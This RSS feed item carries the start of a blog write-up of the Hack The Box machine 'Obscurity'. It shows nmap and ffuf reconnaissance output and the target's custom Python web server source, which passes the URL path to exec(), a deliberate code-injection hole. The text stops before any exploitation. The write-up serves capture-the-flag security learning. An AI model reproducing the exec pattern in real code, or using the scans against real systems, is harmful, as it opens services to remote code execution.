<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Las Aventuras de Ceso</title><link>https://ceso.github.io/es/posts/</link><description>Recent content in Posts on Las Aventuras de Ceso</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Thu, 14 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/es/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/es/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/05/hack-the-box-obscurity/</guid><description>Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.</description><content type="html"><![CDATA[
    <img src="/images/htb/obscurity/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="quick-summary">Quick Summary</h2>
<p>Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&rsquo;t read it <a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">you can click here to go to it</a></p>
<p>I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&hellip;I will try to do them as my time allows me hehe.</p>
<p>For today I just decided to write about Obscurity, which I remember when I did it, it was pretty fun, I enjoyed it quite a lot, and it teach me some nice stuff, still remember when I did it I was struggling a bit with the Python stuff and my bro <a href="https://bullsec.xyz/">MrBulldops</a> gave me a hand to understand it a bit better.</p>
<p>Well, Obscurity is a Linux medium machine, mostly using Python stuff and as the name says before hand, the concept in this one is security by obscurity, so it doesn&rsquo;t use standard web servers and so on, instead it use custom stuff in order to &ldquo;provide security&rdquo; by there being not public ways to exploit it, so you are forced to do some code review, think outside the box, etc.</p>
<p>Cutting the chit-chat let&rsquo;s go into the write up!</p>
<h2 id="nmap">Nmap</h2>
<p>We start with nmap to see which ports are there open:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
Nmap scan report for 10.10.10.168
Host is up (0.084s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Dec 2019 21:42:22
|     Server: BadHTTPServer
|     Last-Modified: Tue, 17 Dec 2019 21:42:22
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;title&gt;0bscura&lt;/title&gt;
|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
|     &lt;!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     &lt;!-- stylesheet css --&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
|     &lt;/head&gt;
|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
|     &lt;!-- preloader section --&gt;
|     &lt;!--
|     &lt;div class=&quot;preloader&quot;&gt;
|     &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Dec 2019 21:42:23
|     Server: BadHTTPServer
|     Last-Modified: Tue, 17 Dec 2019 21:42:23
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;title&gt;0bscura&lt;/title&gt;
|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
|     &lt;!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     &lt;!-- stylesheet css --&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
|     &lt;/head&gt;
|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
|     &lt;!-- preloader section --&gt;
|     &lt;!--
|     &lt;div class=&quot;preloader&quot;&gt;
|_    &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=12/17%Time=5DF94BCA%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2017\x20Dec\x202
SF:019\x2021:42:22\nServer:\x20BadHTTPServer\nLast-Modified:\x20Tue,\x2017
SF:\x20Dec\x202019\x2021:42:22\nContent-Length:\x204171\nContent-Type:\x20
SF:text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\
SF:&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;
SF:\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge\&quot;&gt;\n\t
SF:&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-
SF:scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;\&quot;&gt;\n\t&lt;meta\x20n
SF:ame=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Temp
SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20s
SF:tylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bo
SF:otstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/font-
SF:awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/templ
SF:atemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;scroll\&quot;\x20data-targe
SF:t=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n
SF:&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;sk-spinner\x20sk-spinne
SF:r-wordpress\&quot;&gt;\n&quot;)%r(HTTPOptions,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x2
SF:0Tue,\x2017\x20Dec\x202019\x2021:42:23\nServer:\x20BadHTTPServer\nLast-
SF:Modified:\x20Tue,\x2017\x20Dec\x202019\x2021:42:23\nContent-Length:\x20
SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x2
SF:0html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\
SF:t&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20c
SF:ontent=\&quot;IE=Edge\&quot;&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=de
SF:vice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20cont
SF:ent=\&quot;\&quot;&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\n
SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
SF:ofile\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;styles
SF:heet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;styleshee
SF:t\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;styleshee
SF:t\&quot;\x20href=\&quot;css/templatemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\
SF:&quot;scroll\&quot;\x20data-target=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x2
SF:0section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;
SF:sk-spinner\x20sk-spinner-wordpress\&quot;&gt;\n&quot;);
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
</code></pre><p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &ldquo;BadHTTPServer&rdquo; in port 8080.</p>
<h2 id="web-enumeration">Web enumeration</h2>
<p>From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
There are some sections in the page talking about the service by obscurity and providing information on another &ldquo;products&rdquo; that are built by &ldquo;the company&rdquo; as well some contact information.</p>

    <img src="/images/htb/obscurity/1-webenum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/obscurity/2-webenum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/obscurity/3-webenum.png"  class="center"  style="border-radius: 8px;"  />


<p>In the bottom of the page, there was a mention to &ldquo;Easy Profile&rdquo;:</p>

    <img src="/images/htb/obscurity/4-webenum.png"  class="center"  style="border-radius: 8px;"  />


<p>I look up on google for this, and I found this:</p>

    <img src="/images/htb/obscurity/5-webenum.png"  class="center"  style="border-radius: 8px;"  />


<p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href="https://github.com/ffuf/ffuf">you can get ffuf here</a>.</p>
<p>Then I proceed to fuzze the server and I got some interesting results:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 :: Output file      : obscurity-ffuf.htb
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

--- SNIP ---
develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
:: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
</code></pre><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> threading
<span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> mimetypes
<span style="color:#f92672">import</span> urllib.parse
<span style="color:#f92672">import</span> subprocess

respTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
</span><span style="color:#e6db74">Date: {dateSent}
</span><span style="color:#e6db74">Server: {server}
</span><span style="color:#e6db74">Last-Modified: {modified}
</span><span style="color:#e6db74">Content-Length: {length}
</span><span style="color:#e6db74">Content-Type: {contentType}
</span><span style="color:#e6db74">Connection: {connectionType}
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">{body}
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
DOC_ROOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DocRoot&#34;</span>

CODES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;200&#34;</span>: <span style="color:#e6db74">&#34;OK&#34;</span>, 
        <span style="color:#e6db74">&#34;304&#34;</span>: <span style="color:#e6db74">&#34;NOT MODIFIED&#34;</span>,
        <span style="color:#e6db74">&#34;400&#34;</span>: <span style="color:#e6db74">&#34;BAD REQUEST&#34;</span>, <span style="color:#e6db74">&#34;401&#34;</span>: <span style="color:#e6db74">&#34;UNAUTHORIZED&#34;</span>, <span style="color:#e6db74">&#34;403&#34;</span>: <span style="color:#e6db74">&#34;FORBIDDEN&#34;</span>, <span style="color:#e6db74">&#34;404&#34;</span>: <span style="color:#e6db74">&#34;NOT FOUND&#34;</span>, 
        <span style="color:#e6db74">&#34;500&#34;</span>: <span style="color:#e6db74">&#34;INTERNAL SERVER ERROR&#34;</span>}

MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt&#34;</span>: <span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;css&#34;</span>:<span style="color:#e6db74">&#34;text/css&#34;</span>, <span style="color:#e6db74">&#34;html&#34;</span>:<span style="color:#e6db74">&#34;text/html&#34;</span>, <span style="color:#e6db74">&#34;png&#34;</span>: <span style="color:#e6db74">&#34;image/png&#34;</span>, <span style="color:#e6db74">&#34;jpg&#34;</span>:<span style="color:#e6db74">&#34;image/jpg&#34;</span>, 
        <span style="color:#e6db74">&#34;ttf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>,<span style="color:#e6db74">&#34;otf&#34;</span>:<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>, <span style="color:#e6db74">&#34;woff&#34;</span>:<span style="color:#e6db74">&#34;font/woff&#34;</span>, <span style="color:#e6db74">&#34;woff2&#34;</span>: <span style="color:#e6db74">&#34;font/woff2&#34;</span>, 
        <span style="color:#e6db74">&#34;js&#34;</span>:<span style="color:#e6db74">&#34;application/javascript&#34;</span>,<span style="color:#e6db74">&#34;gz&#34;</span>:<span style="color:#e6db74">&#34;application/zip&#34;</span>, <span style="color:#e6db74">&#34;py&#34;</span>:<span style="color:#e6db74">&#34;text/plain&#34;</span>, <span style="color:#e6db74">&#34;map&#34;</span>: <span style="color:#e6db74">&#34;application/octet-stream&#34;</span>}


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Response</span>:
    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">**</span>kwargs):
        self<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>update(kwargs)
        now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%a, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">stringResponse</span>(self):
        <span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>__dict__)

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
    <span style="color:#66d9ef">def</span> __init__(self, request):
        self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> True
        <span style="color:#66d9ef">try</span>:
            request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
            self<span style="color:#f92672">.</span>method <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;method&#34;</span>]
            self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;doc&#34;</span>]
            self<span style="color:#f92672">.</span>vers <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;vers&#34;</span>]
            self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;header&#34;</span>]
            self<span style="color:#f92672">.</span>body <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;body&#34;</span>]
        <span style="color:#66d9ef">except</span>:
            self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> False

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):        
        req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
        header <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
        body <span style="color:#f92672">=</span> req[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
        headerDict <span style="color:#f92672">=</span> {}
        <span style="color:#66d9ef">for</span> param <span style="color:#f92672">in</span> header:
            pos <span style="color:#f92672">=</span> param<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;: &#34;</span>)
            key, val <span style="color:#f92672">=</span> param[:pos], param[pos<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:]
            headerDict<span style="color:#f92672">.</span>update({key: val})
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;method&#34;</span>: method, <span style="color:#e6db74">&#34;doc&#34;</span>: doc, <span style="color:#e6db74">&#34;vers&#34;</span>: vers, <span style="color:#e6db74">&#34;header&#34;</span>: headerDict, <span style="color:#e6db74">&#34;body&#34;</span>: body}


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Server</span>:
    <span style="color:#66d9ef">def</span> __init__(self, host, port):    
        self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> host
        self<span style="color:#f92672">.</span>port <span style="color:#f92672">=</span> port
        self<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
        self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
        self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>bind((self<span style="color:#f92672">.</span>host, self<span style="color:#f92672">.</span>port))

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listen</span>(self):
        self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
        <span style="color:#66d9ef">while</span> True:
            client, address <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>accept()
            client<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">60</span>)
            threading<span style="color:#f92672">.</span>Thread(target <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>listenToClient,args <span style="color:#f92672">=</span> (client,address))<span style="color:#f92672">.</span>start()

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listenToClient</span>(self, client, address):
        size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
        <span style="color:#66d9ef">while</span> True:
            <span style="color:#66d9ef">try</span>:
                data <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(size)
                <span style="color:#66d9ef">if</span> data:
                    <span style="color:#75715e"># Set the response to echo back the recieved data </span>
                    req <span style="color:#f92672">=</span> Request(data<span style="color:#f92672">.</span>decode())
                    self<span style="color:#f92672">.</span>handleRequest(req, client, address)
                    client<span style="color:#f92672">.</span>shutdown()
                    client<span style="color:#f92672">.</span>close()
                <span style="color:#66d9ef">else</span>:
                    <span style="color:#66d9ef">raise</span> error(<span style="color:#e6db74">&#39;Client disconnected&#39;</span>)
            <span style="color:#66d9ef">except</span>:
                client<span style="color:#f92672">.</span>close()
                <span style="color:#66d9ef">return</span> False
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleRequest</span>(self, request, conn, address):
        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>good:
<span style="color:#75715e">#            try:</span>
                <span style="color:#75715e"># print(str(request.method) + &#34; &#34; + str(request.doc), end=&#39; &#39;)</span>
                <span style="color:#75715e"># print(&#34;from {0}&#34;.format(address[0]))</span>
<span style="color:#75715e">#            except Exception as e:</span>
<span style="color:#75715e">#                print(e)</span>
            document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(request<span style="color:#f92672">.</span>doc, DOC_ROOT)
            statusNum<span style="color:#f92672">=</span>document[<span style="color:#e6db74">&#34;status&#34;</span>]
        <span style="color:#66d9ef">else</span>:
            document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(<span style="color:#e6db74">&#34;/errors/400.html&#34;</span>, DOC_ROOT)
            statusNum<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400&#34;</span>
        body <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;body&#34;</span>]
        
        statusCode<span style="color:#f92672">=</span>CODES[statusNum]
        dateSent <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BadHTTPServer&#34;</span>
        modified <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        length <span style="color:#f92672">=</span> len(body)
        contentType <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#34;mime&#34;</span>] <span style="color:#75715e"># Try and identify MIME type from string</span>
        connectionType <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Closed&#34;</span>


        resp <span style="color:#f92672">=</span> Response(
        statusNum<span style="color:#f92672">=</span>statusNum, statusCode<span style="color:#f92672">=</span>statusCode, 
        dateSent <span style="color:#f92672">=</span> dateSent, server <span style="color:#f92672">=</span> server, 
        modified <span style="color:#f92672">=</span> modified, length <span style="color:#f92672">=</span> length, 
        contentType <span style="color:#f92672">=</span> contentType, connectionType <span style="color:#f92672">=</span> connectionType, 
        body <span style="color:#f92672">=</span> body
        )

        data <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>stringResponse()
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
        conn<span style="color:#f92672">.</span>send(data<span style="color:#f92672">.</span>encode())
        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
        path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
        <span style="color:#66d9ef">try</span>:
            info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
            <span style="color:#66d9ef">print</span>(info<span style="color:#f92672">.</span>format(path))
            <span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
            cwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__))
            docRoot <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(cwd, docRoot)
            <span style="color:#66d9ef">if</span> path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>:
                path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/index.html&#34;</span>
            requested <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, path[<span style="color:#ae81ff">1</span>:])
            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(requested):
                mime <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(requested)
                mime <span style="color:#f92672">=</span> (mime <span style="color:#66d9ef">if</span> mime[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> None <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;text/html&#34;</span>)
                mime <span style="color:#f92672">=</span> MIMES[requested<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]
                <span style="color:#66d9ef">try</span>:
                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
                <span style="color:#66d9ef">except</span>:
                    <span style="color:#66d9ef">with</span> open(requested, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
                        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
                status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;200&#34;</span>
            <span style="color:#66d9ef">else</span>:
                errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;404.html&#34;</span>)
                mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
                <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>format(path)
                status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;404&#34;</span>
        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
            <span style="color:#66d9ef">print</span>(e)
            errorPage <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(docRoot, <span style="color:#e6db74">&#34;errors&#34;</span>, <span style="color:#e6db74">&#34;500.html&#34;</span>)
